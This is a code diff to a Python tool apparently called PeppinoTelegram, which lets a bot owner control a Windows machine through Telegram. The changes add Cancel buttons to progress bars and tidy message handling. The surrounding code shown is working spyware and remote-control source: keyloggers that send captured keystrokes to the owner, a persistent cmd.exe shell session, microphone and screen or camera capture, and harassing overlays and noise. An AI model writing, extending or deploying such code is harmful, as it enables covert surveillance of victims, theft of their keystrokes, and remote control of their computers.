@@ -8,7 +8,7 @@ If you lose control of your telegram bot, you could potentially lose the control
 """
 
 
-__version__ = "2.23"
+__version__ = "2.23.2"
 
 
 #TELEGRAM
@@ -620,11 +620,13 @@ o888ooooood8 `Y8bod88P" o888o   "888" `Y888""8o  `Y8bod8P' o888o `Y8bod8P' o8o  
                                                                                                                                   "Y88888P'
 """
 class EditableMessage:
-    def __init__(self, bot: Bot, chat_id, content: str, autosend: bool=True, bold: bool=False) -> None:
+    def __init__(self, bot: Bot, chat_id, content: str, autosend: bool=True,
+                 bold: bool=False, reply_markup=None) -> None:
         self.bot = bot
         self.bold = bold
         self.chat_id = chat_id
         self.content = content
+        self.reply_markup = reply_markup
         self.sent = False
         if autosend:
             self.send()
@@ -633,22 +635,35 @@ class EditableMessage:
         if self.bold:
             self.content = f"<b>{self.content}</b>"
         try:
-            self.message_id = self.bot.sendMessage(self.chat_id, self.content, parse_mode="HTML" if self.bold else None)["message_id"]
+            self.message_id = self.bot.sendMessage(
+                self.chat_id,
+                self.content,
+                parse_mode="HTML" if self.bold else None,
+                reply_markup=self.reply_markup
+            )["message_id"]
             self.sent = True
             return self.message_id
-        except Exception as e:
-            ...
+        except Exception:
+            return None
     
-    def edit(self, new_content: str) -> bool:
-        if new_content.strip() == self.content.strip():
+    def edit(self, new_content: str, reply_markup=None) -> bool:
+        if new_content.strip() == self.content.strip() and reply_markup == self.reply_markup:
             return False
         if self.bold:
             new_content = f"<b>{new_content}</b>"
         try:
-            self.bot.editMessageText((self.chat_id, self.message_id), new_content, parse_mode="HTML" if self.bold else None)
+            self.bot.editMessageText(
+                (self.chat_id, self.message_id),
+                new_content,
+                parse_mode="HTML" if self.bold else None,
+                reply_markup=reply_markup
+            )
+            self.content = new_content
+            self.reply_markup = reply_markup
             return True
-        except TelegramError as e:
+        except TelegramError:
             return False
+
     
     def delete(self) -> None:
         try:
@@ -693,31 +708,34 @@ o888ooooood8 `Y8bod8P' `Y888""8o `Y8bod88P" o888o o888o o888o `8oooooo.  o888boo
                                                               "Y88888P'
 """
 class LoadingBar:
-    def __init__(self, total: int, chat_id: int, bot: Bot, autosend: bool=True, autodelete: bool=True, showperc: bool=True, label=None, spinner_enabled: bool=True, full_char: str="🔲", empty_char="🔶", spinner_frames=all_spinners["braille"], spinner_pos: str="left", bar_lenght: int=10, pin_message: bool=True):
+    def __init__(self, total: int, chat_id: int, bot: Bot, autosend: bool=True,
+                 autodelete: bool=True, showperc: bool=True, label=None,
+                 spinner_enabled: bool=True, full_char: str="🔲", empty_char="🔶",
+                 spinner_frames=all_spinners["braille"], spinner_pos: str="left",
+                 bar_lenght: int=10, pin_message: bool=False, cancel_button: bool=False):
+        
         self.bot = bot
         self.tot = int(total)
-        self.label = label
         self.chat_id = chat_id
         self.showperc = showperc
+        self.label = label
         self.autodelete = autodelete
-
-
-        self.spinner = spinner_frames
-        self.spinner_index = 0
         self.spinner_enabled = spinner_enabled
-        self.spinner_delay = 0.2
-        self.spinner_pos = spinner_pos
-
         self.full_char = full_char
         self.empty_char = empty_char
-
+        self.spinner = spinner_frames
+        self.spinner_index = 0
+        self.spinner_delay = 0.2
+        self.spinner_pos = spinner_pos
+        self.bar_lenght = bar_lenght
         self.progress = 0
         self.done = False
         self.deleted = False
-        self.bar_lenght = bar_lenght
-
-        self.bar = self.get_bar()
         self.pin_message = pin_message
+        self.cancel_button = cancel_button
+        if cancel_button:
+            self.canceled = False
+        self.ETDMessage = None
 
         if autosend:
             self.setup()
@@ -725,75 +743,68 @@ class LoadingBar:
     def get_bar(self):
         self.perc_progress = round((self.progress / self.tot) * 100, 1)
         self.int_perc_progress = int(self.perc_progress)
-        bar = self.full_char * (self.int_perc_progress//self.bar_lenght) + (self.empty_char * ((self.bar_lenght - (self.int_perc_progress//self.bar_lenght))))
-        bar = f"{bar}" + (f"{self.perc_progress}%" if self.showperc else "")
+        bar = self.full_char * (self.int_perc_progress//self.bar_lenght) + \
+              self.empty_char * (self.bar_lenght - (self.int_perc_progress//self.bar_lenght))
+        if self.showperc:
+            bar += f" {self.perc_progress}%"
         if self.label:
             bar = f"{self.label}\n{bar}"
         if self.spinner_enabled:
-            bar = f"{self.spinner[self.spinner_index]}{bar}" if self.spinner_pos == "left" else f"{bar}{self.spinner[self.spinner_index]}"
+            bar = f"{self.spinner[self.spinner_index]}{bar}" if self.spinner_pos=="left" else f"{bar}{self.spinner[self.spinner_index]}"
         return bar
 
-    def spinner_cycle(self):
-        while self.perc_progress < 100:
-            new_bar = self.get_bar()
-            self.ETDMessage.edit(new_bar)
-            if self.spinner_index == len(self.spinner)-1:
-                self.spinner_index = 0
-            else:
-                self.spinner_index += 1
-            sleep(self.spinner_delay)
-
-    def prep_animation(self, repeat: int = 2, progress: int = 25) -> None:
-        for i in range(repeat):
-            for i in range(0, 101, progress):
-                self.set_progress(i)
-                self.update()
-                sleep(0.05)
-            for i in range(100, 0, -progress):
-                self.set_progress(i)
-                self.update()
-                sleep(0.05)
-
-            for i in range(0, 101, progress):
-                self.set_progress(i)
-                self.update()
-            sleep(0.05)
-        self.set100()
-        self.delete()
-
     def setup(self):
-        bar = self.get_bar()
-        self.ETDMessage = EditableMessage(self.bot, self.chat_id, bar)
-        self.bot.pinChatMessage(self.chat_id, self.ETDMessage.message_id)
+        bar_text = self.get_bar()
+        reply_markup = None
+        if self.cancel_button:
+            keyboard = [[InlineKeyboardButton(text="Cancel", callback_data=f"cancel_loading:{id(self)}")]]
+            reply_markup = InlineKeyboardMarkup(inline_keyboard=keyboard)
+
+        self.ETDMessage = self.bot.sendMessage(self.chat_id, bar_text, reply_markup=reply_markup)
+        
+        if self.pin_message:
+            self.bot.pinChatMessage(self.chat_id, self.ETDMessage["message_id"])
+        
         if self.spinner_enabled:
             t = Thread(target=self.spinner_cycle)
             t.start()
 
-    def set_progress(self, progress: int) -> None:
-        self.progress = progress
+    def spinner_cycle(self):
+        while not self.done and self.progress < self.tot:
+            self.spinner_index = (self.spinner_index + 1) % len(self.spinner)
+            self.update()
+            sleep(self.spinner_delay)
 
-    def update(self, new_progress: None|int=None):
-        if new_progress:
-            self.set_progress(new_progress)
+    def update(self, new_progress: int=None):
+        if new_progress is not None:
+            self.progress = new_progress
         if self.done:
             return
-        previous_bar = self.bar
-        bar = self.get_bar()
-        if bar!=previous_bar:
-            self.ETDMessage.edit(bar)
-            return
-        if self.int_perc_progress >= 100 and self.autodelete:
-            self.ETDMessage.delete()
-            self.done = True
-    
+        try:
+            self.bot.editMessageText(
+                (self.chat_id, self.ETDMessage["message_id"]),
+                self.get_bar(),
+                reply_markup=self.ETDMessage.get("reply_markup")  # keep the cancel button
+            )
+        except TelegramError:
+            ...
+
+    def cancel(self):
+        self.done = True
+        self.delete()
+        self.bot.sendMessage(self.chat_id, "Loading cancelled.")
+
+    def delete(self):
+        try:
+            if not self.deleted:
+                self.deleted = True
+                self.bot.deleteMessage((self.chat_id, self.ETDMessage["message_id"]))
+        except TelegramError as e:
+            print("cant delete this shit", e)
+
     def fill_and_delete(self) -> None:
         self.set100()
         self.delete()
-    
-    def delete(self):
-        if not self.deleted:
-            self.deleted = True
-            self.ETDMessage.delete()
     
     def set100(self):
         if self.done:
@@ -865,6 +876,7 @@ class PeppinoTelegram:
         self.all_session_messages: list[int] = []
 
         self.hdmiDrownerOverlayPlayer: HDMIDrownedOverlay = HDMIDrownedOverlay()
+        self.bars: dict[int:LoadingBar] = {}
 
         self.cmd_session = CMDSession("cmd.exe /K cd /d %USERPROFILE%'")
         self.cmd_session_active: bool = False
@@ -1405,6 +1417,9 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
         loading_bar = self.new_loading_bar(timeout, f"{emoji_dict["keyboard"]} Keylogger with file", showperc=True)
         while (time()-start)<timeout:
             loading_bar.update(time()-start)
+            if loading_bar.canceled:
+                loading_bar.fill_and_delete()
+                return
             event = read_event()
             if event.event_type == KEY_DOWN:
                 name = event.name
@@ -1442,6 +1457,9 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
         elapsed = 0
         Thread(target=self.keylogger_to_buffer, args=(state, )).start()
         while elapsed < timeout:
+            if bar.canceled:
+                bar.fill_and_delete()
+                return
             elapsed = time()-start
             bar.update(elapsed)
             buffer_message.edit(state["value"])
@@ -1768,8 +1786,8 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
         return editable
 
     def new_loading_bar(self, total: int, autodelete: bool=False, showperc:bool=False, label=None) -> LoadingBar:
-        loadingbar = LoadingBar(total, self.owner_id, self.bot, autodelete=autodelete, showperc=showperc, label=label, full_char=self.loading_bar_set[0], empty_char=self.loading_bar_set[1], spinner_frames=self.loading_bar_spinner, spinner_pos="right", bar_lenght=10) 
-        self.all_session_messages.append(loadingbar.ETDMessage.message_id)
+        loadingbar = LoadingBar(total, self.owner_id, self.bot, autodelete=autodelete, showperc=showperc, label=label, full_char=self.loading_bar_set[0], empty_char=self.loading_bar_set[1], spinner_frames=self.loading_bar_spinner, spinner_pos="right", bar_lenght=10, cancel_button=True) 
+        self.bars.update({id(loadingbar):loadingbar})
         return loadingbar
 
     def new_menu(self, menu: dict[str:Any], autosend: bool=True, label: str="Choose an option: ", page: int=0, next_btn: bool=False, next_btn_lab: str="next_page", prev_btn_lab: str="previus_page", close_btn_lab: str="close_page", rows=2) -> ButtonsMenu:
@@ -1908,6 +1926,11 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
                 elif command == "mainmenu_prev":
                     self.mainmenu_ref.delete()
                     self.mainmenu_ref.send_previous_page()
+
+        elif command.startswith("cancel_loading"):
+            bar_id = int(command.split(":")[1])
+            self.bars[bar_id].canceled = True
+            del self.bars[bar_id]
         else:
             self.bsend(f"Invalid command {command}")
     
@@ -2117,10 +2140,17 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
 
     def wrapper_playrandomnoise(self, duration: int) -> None:
         start = time()
-        loading_bar = self.new_loading_bar(duration) 
-        thread = Thread(target=play_random_noise, args=(duration,))
+        loading_bar = self.new_loading_bar(duration, label="Play Random Noise")
+        regulator = {
+            "running":1
+        }
+        thread = Thread(target=play_random_noise, args=(duration,regulator))
         thread.start()
         while (time()-start) < duration:
+            print(f"{loading_bar.canceled=}")
+            if loading_bar.canceled:
+                regulator["running"] = 0
+                break
             elapsed = int(time()-start)
             loading_bar.update(elapsed)
             sleep(1)
@@ -2196,12 +2226,18 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
             start_time = time()
             current_whisper = None
             last_change = 0
-            whisper_loading_bar = self.new_loading_bar(duration)
+            whisper_loading_bar = self.new_loading_bar(duration, label="👻 Whisper Overlay")
+            if whisper_loading_bar.canceled:
+                whisper_loading_bar.fill_and_delete()
+                return
             
             def update_whisper():
                 nonlocal current_whisper, last_change
                 current_time = time()
                 whisper_loading_bar.update(current_time-start_time)
+                if whisper_loading_bar.canceled:
+                    whisper_loading_bar.fill_and_delete()
+                    return
                 if current_time - last_change > uniform(2, 5):
                     current_whisper = choice(whispers)
                     label.config(text=current_whisper)
@@ -2251,6 +2287,9 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
         loading_bar = self.new_loading_bar(timeout, label=f"{emoji_dict['keyboard']} Random Keyboard", showperc=True)
         while (time()-start)<timeout:
             loading_bar.update(time()-start)
+            if loading_bar.canceled:
+                loading_bar.fill_and_delete()
+                return
             event = read_event()
             if event.event_type == KEY_DOWN:
                 e = event.name.split()[0]
@@ -2302,6 +2341,9 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
 
             time_elapsed = 0
             while int(time_elapsed) < duration:
+                if bar.canceled:
+                    bar.fill_and_delete()
+                    return
                 time_elapsed = time() - start_time
                 bar.progress = time_elapsed
                 bar.update()
@@ -2350,6 +2392,9 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
             audio_data = sd.rec(frames, samplerate=samplerate, channels=channels, dtype='int16')
             time_elapsed = 0
             while int(time_elapsed) < duration:
+                if bar.canceled:
+                    bar.fill_and_delete()
+                    return
                 time_elapsed = time() - start_time
                 bar.progress = time_elapsed
                 bar.update()
@@ -2400,6 +2445,9 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
 
             time_elapsed = 0 
             while int(time_elapsed) < capture_duration:
+                if bar.canceled:
+                    bar.fill_and_delete()
+                    return
                 time_elapsed = time() - start_time
                 bar.progress = time_elapsed
                 bar.update()
@@ -2511,6 +2559,8 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
         res = True
         self.opencap()
         while time()-start <= seconds and res:
+            if loading_bar.canceled:
+                break
             loading_bar.update(time()-start)
             res, frame = self.cap.read()
             frame = pad_to_16_9(frame)
@@ -2767,9 +2817,12 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
         start = time()
         Thread(target=player.run, args=(timeout_seconds, )).start()
         while (time()-start) < timeout_seconds:
+            if loading_bar.canceled:
+                break
             loading_bar.update(time()-start)
             sleep(1)
         loading_bar.fill_and_delete()
+        player.stop()
 
     def wrapper_for_hdmi_overlay(self, timeout_seconds: int) -> None:
         Thread(target=self._wrapper_for_hdmi_overlay, args=(timeout_seconds,self.hdmiDrownerOverlayPlayer)).start()
